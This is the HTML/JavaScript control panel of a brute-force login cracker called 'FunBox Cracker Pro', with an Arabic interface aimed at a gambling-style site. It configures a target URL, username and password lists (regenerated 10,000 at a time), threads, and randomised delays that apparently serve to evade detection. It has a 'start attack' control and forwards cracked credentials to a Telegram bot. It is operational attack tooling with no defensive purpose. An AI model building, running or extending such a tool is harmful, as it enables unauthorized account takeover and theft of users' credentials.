<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FunBox Cracker Pro</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto Mono', monospace;
            background: #0a0e17;
            color: #00ff88;
            min-height: 100vh;
        }
        .navbar {
            background: rgba(10, 14, 23, 0.95);
            border-bottom: 1px solid rgba(0, 255, 136, 0.15);
            padding: 12px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            backdrop-filter: blur(10px);
            position: sticky;
            top: 0;
            z-index: 100;
            flex-wrap: wrap;
            gap: 10px;
        }
        .logo {
            font-family: 'Orbitron', monospace;
            font-weight: 900;
            font-size: 20px;
            color: #00ff88;
            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }
        .logo span { color: #ff6b6b; }
        .logo small { font-size: 11px; color: #8899aa; font-weight: 400; }
        .nav-status {
            font-size: 12px;
            color: #8899aa;
            display: flex;
            align-items: center;
            gap: 15px;
            flex-wrap: wrap;
        }
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
        }
        .status-dot.idle { background: #8899aa; }
        .status-dot.running { background: #00ff88; animation: pulse 0.8s infinite; }
        .status-dot.found { background: #ffd93d; animation: pulse 0.5s infinite; }
        .status-dot.error { background: #ff6b6b; }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(0.7); }
        }
        .container {
            max-width: 1300px;
            margin: 25px auto;
            padding: 0 20px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
        }
        .card {
            background: rgba(16, 22, 36, 0.92);
            border-radius: 16px;
            border: 1px solid rgba(0, 255, 136, 0.1);
            padding: 22px;
            backdrop-filter: blur(10px);
            transition: all 0.3s;
        }
        .card:hover { border-color: rgba(0, 255, 136, 0.25); }
        .card-title {
            font-family: 'Orbitron', monospace;
            font-size: 13px;
            color: #00ff88;
            margin-bottom: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
            letter-spacing: 1px;
        }
        .card-title .icon { font-size: 18px; }
        .card-title .badge {
            background: rgba(0, 255, 136, 0.15);
            padding: 2px 12px;
            border-radius: 20px;
            font-size: 10px;
            color: #00ff88;
            margin-left: auto;
        }
        .input-group {
            margin-bottom: 12px;
        }
        .input-group label {
            display: block;
            font-size: 10px;
            color: #8899aa;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 4px;
        }
        .input-group input, .input-group textarea {
            width: 100%;
            padding: 10px 14px;
            background: rgba(0, 255, 136, 0.05);
            border: 1px solid rgba(0, 255, 136, 0.12);
            border-radius: 8px;
            color: #00ff88;
            font-family: 'Roboto Mono', monospace;
            font-size: 13px;
            transition: all 0.3s;
        }
        .input-group input:focus, .input-group textarea:focus {
            outline: none;
            border-color: #00ff88;
            box-shadow: 0 0 25px rgba(0, 255, 136, 0.08);
        }
        .input-group textarea {
            min-height: 60px;
            resize: vertical;
            font-size: 11px;
        }
        .input-group .hint {
            font-size: 10px;
            color: #445566;
            margin-top: 3px;
        }
        .btn {
            padding: 10px 22px;
            border: none;
            border-radius: 8px;
            font-family: 'Orbitron', monospace;
            font-size: 12px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 0.5px;
        }
        .btn-primary {
            background: #00ff88;
            color: #0a0e17;
        }
        .btn-primary:hover {
            background: #00cc6a;
            box-shadow: 0 0 35px rgba(0, 255, 136, 0.25);
            transform: translateY(-2px);
        }
        .btn-danger {
            background: #ff6b6b;
            color: #0a0e17;
        }
        .btn-danger:hover {
            background: #cc5555;
            box-shadow: 0 0 35px rgba(255, 107, 107, 0.25);
            transform: translateY(-2px);
        }
        .btn-secondary {
            background: rgba(255, 255, 255, 0.05);
            color: #8899aa;
            border: 1px solid rgba(255, 255, 255, 0.08);
        }
        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.1);
            color: #00ff88;
        }
        .btn-warning {
            background: #ffd93d;
            color: #0a0e17;
        }
        .btn-warning:hover {
            background: #e6c030;
            box-shadow: 0 0 35px rgba(255, 217, 61, 0.25);
            transform: translateY(-2px);
        }
        .btn:disabled {
            opacity: 0.35;
            cursor: not-allowed;
            transform: none !important;
        }
        .btn-group {
            display: flex;
            gap: 8px;
            margin-top: 12px;
            flex-wrap: wrap;
        }
        .btn-group .btn { flex: 1; min-width: 80px; }
        .progress-section {
            margin-top: 12px;
        }
        .progress-stats {
            display: flex;
            justify-content: space-between;
            font-size: 11px;
            color: #8899aa;
            margin-bottom: 6px;
        }
        .progress-bar {
            width: 100%;
            height: 5px;
            background: rgba(0, 255, 136, 0.08);
            border-radius: 3px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff88, #00ffcc, #ffd93d);
            border-radius: 3px;
            transition: width 0.4s ease;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 12px 0;
        }
        .stat-item {
            background: rgba(0, 255, 136, 0.04);
            border-radius: 8px;
            padding: 10px;
            text-align: center;
            border: 1px solid rgba(0, 255, 136, 0.06);
        }
        .stat-item .number {
            font-size: 20px;
            font-weight: 700;
            color: #00ff88;
        }
        .stat-item .label {
            font-size: 9px;
            color: #8899aa;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .result-box {
            margin-top: 12px;
            padding: 14px;
            background: rgba(0, 255, 136, 0.05);
            border-radius: 8px;
            border: 1px solid rgba(0, 255, 136, 0.15);
            display: none;
        }
        .result-box.show { display: block; }
        .result-box .found-title {
            color: #ffd93d;
            font-size: 15px;
            font-weight: 700;
        }
        .result-box .found-detail {
            font-size: 13px;
            color: #00ff88;
            margin-top: 4px;
            word-break: break-all;
        }
        .result-box .telegram-status {
            font-size: 11px;
            margin-top: 6px;
        }
        .result-box .telegram-status.success { color: #00ff88; }
        .result-box .telegram-status.error { color: #ff6b6b; }
        .quick-actions {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
            margin-top: 10px;
        }
        .quick-actions .btn {
            font-size: 9px;
            padding: 5px 12px;
        }
        .footer {
            text-align: center;
            padding: 20px;
            color: #445566;
            font-size: 11px;
            border-top: 1px solid rgba(0, 255, 136, 0.05);
            margin-top: 15px;
        }
        .footer span { color: #00ff88; }
        @media (max-width: 768px) {
            .container { grid-template-columns: 1fr; }
            .navbar { padding: 10px 16px; flex-direction: column; align-items: stretch; }
            .logo { font-size: 16px; text-align: center; }
            .nav-status { justify-content: center; font-size: 10px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
        }
        @media (max-width: 480px) {
            .btn-group { flex-direction: column; }
            .card { padding: 14px; }
            .stats-grid { grid-template-columns: 1fr 1fr; }
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="logo">⚡ Fun<span>Box</span> Cracker <small>Pro</small></div>
        <div class="nav-status">
            <span class="status-dot idle" id="navDot"></span>
            <span id="navStatusText">متوقف</span>
            <span style="color:#445566;">|</span>
            <span id="navProgress">0 / 0</span>
            <span style="color:#445566;">|</span>
            <span id="navSpeed" style="color:#00ff88;">🚀 0 محاولة/ث</span>
        </div>
    </nav>
    
    <div class="container">
        <div class="card">
            <div class="card-title">
                <span class="icon">⚙️</span> الإعدادات
                <span class="badge" id="passCount">{{ config.passwords|length }}</span>
            </div>
            
            <div class="input-group">
                <label>🤖 توكن البوت</label>
                <input type="text" id="botToken" placeholder="1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ" value="{{ config.bot_token }}">
            </div>
            
            <div class="input-group">
                <label>📱 معرف الشات</label>
                <input type="text" id="chatId" placeholder="123456789" value="{{ config.chat_id }}">
            </div>
            
            <div class="input-group">
                <label>🌐 الموقع المستهدف</label>
                <input type="text" id="targetUrl" placeholder="https://www.fun-box.vip" value="{{ config.target_url }}">
            </div>
            
            <div class="input-group">
                <label>👤 أسماء المستخدمين (كل اسم في سطر)</label>
                <textarea id="usernamesList" style="min-height:80px;">{% for u in config.usernames %}{{ u }}{% if not loop.last %}\n{% endif %}{% endfor %}</textarea>
                <div class="hint">{{ config.usernames|length }} اسم مستخدم</div>
            </div>
            
            <div class="input-group">
                <label>🔑 كلمات المرور (كل كلمة في سطر) — <span style="color:#ffd93d;">{{ config.passwords|length }} كلمة</span></label>
                <textarea id="passwordsList" style="min-height:80px;font-size:10px;">{% for p in config.passwords[:50] %}{{ p }}{% if not loop.last %}\n{% endif %}{% endfor %}</textarea>
                <div class="hint">عرض 50 فقط من {{ config.passwords|length }} كلمة • 
                    <button class="btn btn-secondary" style="padding:2px 10px;font-size:9px;" onclick="regeneratePasswords()">🔄 تجديد عشوائي</button>
                </div>
            </div>
            
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;">
                <div class="input-group">
                    <label>⏱️ التأخير الأدنى</label>
                    <input type="number" id="delayMin" value="{{ config.delay_min }}" step="0.1" min="0.1">
                </div>
                <div class="input-group">
                    <label>⏱️ التأخير الأقصى</label>
                    <input type="number" id="delayMax" value="{{ config.delay_max }}" step="0.1" min="0.1">
                </div>
                <div class="input-group">
                    <label>🧵 عدد الخيوط</label>
                    <input type="number" id="threads" value="{{ config.threads }}" min="1" max="50">
                </div>
            </div>
            
            <div class="input-group">
                <label>📌 كلمات النجاح (مفصولة بفاصلة)</label>
                <input type="text" id="successKeywords" placeholder="dashboard,profile,welcome" value="{{ config.success_keywords|join(',') }}">
            </div>
            
            <div class="btn-group">
                <button class="btn btn-secondary" onclick="saveConfig()">💾 حفظ</button>
                <button class="btn btn-secondary" onclick="testBot()">📨 اختبار البوت</button>
            </div>
            <div id="configStatus" style="font-size:11px;color:#8899aa;margin-top:8px;"></div>
        </div>
        
        <div class="card">
            <div class="card-title">
                <span class="icon">🎯</span> لوحة التحكم
                <span class="badge" id="statusBadge">متوقف</span>
            </div>
            
            <div class="stats-grid">
                <div class="stat-item">
                    <div class="number" id="statUsers">{{ config.usernames|length }}</div>
                    <div class="label">👤 مستخدمين</div>
                </div>
                <div class="stat-item">
                    <div class="number" id="statPass">{{ config.passwords|length }}</div>
                    <div class="label">🔑 كلمات مرور</div>
                </div>
                <div class="stat-item">
                    <div class="number" id="statCombos">{{ config.usernames|length * config.passwords|length }}</div>
                    <div class="label">🔄 تركيبات</div>
                </div>
            </div>
            
            <div class="progress-section">
                <div class="progress-stats">
                    <span id="progressLabel">التقدم</span>
                    <span id="progressText">0 / 0</span>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill" style="width:0%;"></div>
                </div>
            </div>
            
            <div class="btn-group">
                <button class="btn btn-primary" id="startBtn" onclick="startAttack()">▶ بدء الهجوم</button>
                <button class="btn btn-danger" id="stopBtn" onclick="stopAttack()" disabled>■ إيقاف</button>
                <button class="btn btn-warning" onclick="regeneratePasswords()" style="flex:0.5;">🔄</button>
            </div>
            
            <div id="statusMessage" style="font-size:12px;color:#8899aa;margin-top:8px;text-align:center;min-height:18px;"></div>
            
            <div class="result-box" id="resultBox">
                <div class="found-title">✅ تم العثور على بيانات!</div>
                <div class="found-detail" id="resultDetail">👤 admin | 🔑 123456</div>
                <div class="telegram-status" id="telegramStatus">📨 جاري الإرسال...</div>
            </div>
            
            <div class="quick-actions">
                <button class="btn btn-secondary" onclick="refreshStatus()">🔄 تحديث</button>
                <button class="btn btn-secondary" onclick="resetDefaults()">↺ افتراضي</button>
            </div>
        </div>
    </div>
    
    <div class="footer">
        ⚡ <span>FunBox Cracker Pro</span> — {{ config.passwords|length }} كلمة مرور مدمجة • 2026
    </div>
    
    <script>
        let statusInterval = null;
        let isRunning = false;
        let lastAttempt = 0;
        let speed = 0;
        
        function saveConfig() {
            const data = {
                bot_token: document.getElementById('botToken').value.trim(),
                chat_id: document.getElementById('chatId').value.trim(),
                target_url: document.getElementById('targetUrl').value.trim(),
                usernames: document.getElementById('usernamesList').value,
                passwords: document.getElementById('passwordsList').value,
                success_keywords: document.getElementById('successKeywords').value,
                delay_min: document.getElementById('delayMin').value,
                delay_max: document.getElementById('delayMax').value,
                threads: document.getElementById('threads').value
            };
            
            fetch('/api/config', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById('configStatus').innerHTML = '✅ تم حفظ الإعدادات (' + data.passwords_count + ' كلمة)';
                document.getElementById('configStatus').style.color = '#00ff88';
                setTimeout(() => { document.getElementById('configStatus').innerHTML = ''; }, 3000);
                updateStats();
            })
            .catch(() => {
                document.getElementById('configStatus').innerHTML = '❌ خطأ في الحفظ';
                document.getElementById('configStatus').style.color = '#ff6b6b';
            });
        }
        
        function regeneratePasswords() {
            document.getElementById('configStatus').innerHTML = '⏳ جاري تجديد 10,000 كلمة مرور...';
            document.getElementById('configStatus').style.color = '#ffd93d';
            
            fetch('/api/regenerate', { method: 'POST' })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'error') {
                        document.getElementById('configStatus').innerHTML = '❌ ' + data.message;
                        document.getElementById('configStatus').style.color = '#ff6b6b';
                        return;
                    }
                    document.getElementById('configStatus').innerHTML = '✅ تم تجديد ' + data.count + ' كلمة مرور';
                    document.getElementById('configStatus').style.color = '#00ff88';
                    document.getElementById('passCount').textContent = data.count;
                    updateStats();
                    setTimeout(() => { document.getElementById('configStatus').innerHTML = ''; }, 3000);
                })
                .catch(() => {
                    document.getElementById('configStatus').innerHTML = '❌ فشل التجديد';
                    document.getElementById('configStatus').style.color = '#ff6b6b';
                });
        }
        
        function testBot() {
            const botToken = document.getElementById('botToken').value.trim();
            const chatId = document.getElementById('chatId').value.trim();
            
            if (!botToken || !chatId) {
                document.getElementById('configStatus').innerHTML = '❌ أدخل التوكن والمعرف أولاً';
                document.getElementById('configStatus').style.color = '#ff6b6b';
                return;
            }
            
            document.getElementById('configStatus').innerHTML = '⏳ جاري الاختبار...';
            document.getElementById('configStatus').style.color = '#ffd93d';
            
            fetch('/api/test_bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ bot_token: botToken, chat_id: chatId })
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById('configStatus').innerHTML = data.success ? '✅ ' + data.message : '❌ ' + data.message;
                document.getElementById('configStatus').style.color = data.success ? '#00ff88' : '#ff6b6b';
            })
            .catch(() => {
                document.getElementById('configStatus').innerHTML = '❌ فشل الاتصال';
                document.getElementById('configStatus').style.color = '#ff6b6b';
            });
        }
        
        function updateStats() {
            fetch('/api/status')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('statUsers').textContent = data.usernames_count || 0;
                    document.getElementById('statPass').textContent = data.passwords_count || 0;
                    document.getElementById('statCombos').textContent = (data.usernames_count || 0) * (data.passwords_count || 0);
                })
                .catch(() => {});
        }
        
        function startAttack() {
            fetch('/api/start', { method: 'POST' })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'error') {
                        document.getElementById('statusMessage').textContent = '❌ ' + data.message;
                        document.getElementById('statusMessage').style.color = '#ff6b6b';
                        return;
                    }
                    if (data.status === 'started') {
                        isRunning = true;
                        document.getElementById('startBtn').disabled = true;
                        document.getElementById('stopBtn').disabled = false;
                        document.getElementById('resultBox').classList.remove('show');
                        document.getElementById('statusMessage').textContent = '⏳ جاري الهجوم في الخلفية...';
                        document.getElementById('statusMessage').style.color = '#ffd93d';
                        document.getElementById('statusBadge').textContent = '⏳ قيد التشغيل';
                        if (statusInterval) clearInterval(statusInterval);
                        statusInterval = setInterval(updateStatus, 800);
                        updateStatus();
                    }
                });
        }
        
        function stopAttack() {
            fetch('/api/stop', { method: 'POST' })
                .then(res => res.json())
                .then(data => {
                    isRunning = false;
                    document.getElementById('startBtn').disabled = false;
                    document.getElementById('stopBtn').disabled = true;
                    document.getElementById('statusMessage').textContent = '⏹️ تم الإيقاف';
                    document.getElementById('statusMessage').style.color = '#ff6b6b';
                    document.getElementById('statusBadge').textContent = '⏹️ متوقف';
                    if (statusInterval) clearInterval(statusInterval);
                    updateStatus();
                });
        }
        
        function updateStatus() {
            fetch('/api/status')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('progressText').textContent = data.current + ' / ' + data.total;
                    const percent = data.total > 0 ? (data.current / data.total * 100) : 0;
                    document.getElementById('progressFill').style.width = Math.min(percent, 100) + '%';
                    
                    document.getElementById('navProgress').textContent = data.current + ' / ' + data.total;
                    
                    if (data.current > lastAttempt) {
                        speed = data.current - lastAttempt;
                    }
                    lastAttempt = data.current;
                    document.getElementById('navSpeed').textContent = '🚀 ' + speed + ' محاولة/ث';
                    
                    const dot = document.getElementById('navDot');
                    const statusText = document.getElementById('navStatusText');
                    
                    if (data.done && data.result) {
                        dot.className = 'status-dot found';
                        statusText.textContent = '✅ تم العثور!';
                        document.getElementById('startBtn').disabled = false;
                        document.getElementById('stopBtn').disabled = true;
                        document.getElementById('statusMessage').textContent = '✅ تم العثور على بيانات!';
                        document.getElementById('statusMessage').style.color = '#00ff88';
                        document.getElementById('statusBadge').textContent = '✅ مكتمل';
                        isRunning = false;
                        if (statusInterval) clearInterval(statusInterval);
                        
                        const box = document.getElementById('resultBox');
                        box.classList.add('show');
                        document.getElementById('resultDetail').textContent = 
                            '👤 ' + data.result.username + ' | 🔑 ' + data.result.password;
                        
                        const tgStatus = document.getElementById('telegramStatus');
                        if (data.result.telegram_success) {
                            tgStatus.className = 'telegram-status success';
                            tgStatus.textContent = '✅ ' + data.result.telegram_status;
                        } else {
                            tgStatus.className = 'telegram-status error';
                            tgStatus.textContent = '❌ ' + data.result.telegram_status;
                        }
                    } else if (data.active) {
                        dot.className = 'status-dot running';
                        statusText.textContent = '🔄 قيد التشغيل';
                        document.getElementById('statusBadge').textContent = '⏳ ' + Math.round(percent) + '%';
                    } else {
                        dot.className = 'status-dot idle';
                        statusText.textContent = data.status || 'متوقف';
                        if (!data.active && !data.done && isRunning) {
                            document.getElementById('startBtn').disabled = false;
                            document.getElementById('stopBtn').disabled = true;
                            isRunning = false;
                            if (statusInterval) clearInterval(statusInterval);
                        }
                    }
                })
                .catch(() => {});
        }
        
        function resetDefaults() {
            if (confirm('إعادة تحميل الصفحة لاستعادة الإعدادات الافتراضية؟')) {
                location.reload();
            }
        }
        
        function refreshStatus() {
            updateStatus();
            updateStats();
        }
        
        // ===== تشغيل تلقائي =====
        updateStatus();
        updateStats();
        setInterval(updateStatus, 3000);
    </script>
</body>
</html>
